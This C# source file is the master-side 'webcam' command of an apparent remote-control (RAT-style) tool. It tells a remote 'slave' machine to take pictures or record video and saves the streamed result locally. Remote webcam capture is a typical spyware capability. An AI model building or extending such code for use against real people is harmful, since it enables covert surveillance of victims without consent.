using Master.AdvancedConsole;
using Master.Commands.Core;
using System;
using System.Collections.Generic;
using System.IO;
using Master.Core;

namespace Webcam_master
{
    internal class Webcam : IMasterCommand
    {
        public string name { get; } = "webcam";

        public string description { get; } = "Webcam control utility, able to take pictures and record videos";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "picture ?*:[filename.png]",
            "video ?*:[filename.mp4]"
        };

        public void Process(List<string> args)
        {
            var fileName = args[1];

            var result = MasterNetworkManager.GetInstance().ReadLine();

            if (result != "OK")
            {
                ColorTools.WriteCommandError(result == "KO"
                    ? "Unable to use the webcam in the default timespan, maybe another application is using it"
                    : "Unable to find a webcam on the remote slave");

                return;
            }

            if (args[0] == "video")
            {
                Console.Write("Press [ENTER] to stop the recording... ");
                Console.ReadLine();
                MasterNetworkManager.GetInstance().WriteLine("STOP");
            }

            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create))
                {
                    MasterNetworkManager.GetInstance().NetworkStreamToStream(fs);
                }

                ColorTools.WriteCommandSuccess($"{(args[0] == "video" ? "Video" : "Webcam shot")} saved : {fileName}");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(fileName);
                ColorTools.WriteCommandError("An error occured");
            }
        }
    }
}
